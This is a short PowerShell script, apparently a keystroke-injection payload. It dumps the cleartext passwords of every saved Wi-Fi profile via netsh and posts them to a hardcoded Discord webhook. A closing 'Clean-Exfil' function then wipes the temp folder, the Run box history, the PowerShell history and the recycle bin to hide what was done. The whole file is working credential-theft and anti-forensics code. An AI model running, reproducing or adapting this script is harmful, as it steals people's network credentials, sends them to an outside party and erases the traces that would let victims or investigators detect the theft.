$u="https://discord.com/api/webhooks/1448171091561418896/qbtM5A8JrB-cV4HhDEM8itLK4zu2lR5hWaFnPxwTwdXXMGf0nJkXLxNp0EiHfQl4P8m"
$data=""
foreach($line in (netsh wlan show profiles)) {
    if($line -match "All User Profile.*:\s+(.+)") {
        $name=$matches[1].Trim()
        $output=netsh wlan show profile name="$name" key=clear
        if($output -match "Key Content.*:\s+(.+)") {
            $data+="$name : $($matches[1])`n"
        }
    }
}
$body=@{content="```$data```"}
Invoke-RestMethod -Uri $u -Method Post -Body ($body|ConvertTo-Json) -ContentType "application/json"




############################################################################################################################################
function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################
